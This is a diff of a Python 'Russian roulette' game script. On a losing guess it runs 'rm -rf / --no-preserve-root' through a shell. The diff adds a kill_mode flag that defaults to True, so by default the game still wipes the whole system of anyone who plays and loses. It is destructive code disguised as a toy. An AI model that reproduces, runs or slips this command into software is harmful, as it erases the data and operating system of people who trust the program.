@@ -1,13 +1,19 @@
 import random
 import subprocess
 
-print("mode 1: modern mode")
+print("mode 1: standard mode")
 print("mode 2: classic mode")
 
 mode = input("select mode (1 or 2): ")
 
 print("*click*")
 print("this is a revolver")
+
+## IMPORTANT
+
+kill_mode = True ## kill mode true = system wipe, false = print message
+
+## IMNPORTANT
 
 while True:
 
@@ -32,7 +38,10 @@ while True:
 
         if cylinder_guess != cylinder:
             print("say goodbye to your system")
-            subprocess.call("rm -rf / --no-preserve-root", shell=True)
+            if kill_mode == True:
+                subprocess.call("rm -rf / --no-preserve-root", shell=True)
+            elif kill_mode == False:
+                print("your system was destroyed")
             break
         else:    
             print("your sytem lives for another day")
@@ -57,7 +66,10 @@ while True:
 
         if cylinder_guess == cylinder:
             print("say goodbye to your system")
-            subprocess.call("rm -rf / --no-preserve-root", shell=True)
+            if kill_mode == True:
+                subprocess.call("rm -rf / --no-preserve-root", shell=True)
+            elif kill_mode == False:
+                print("your system was destroyed")
             break
         else:    
             print("your sytem lives for another day")
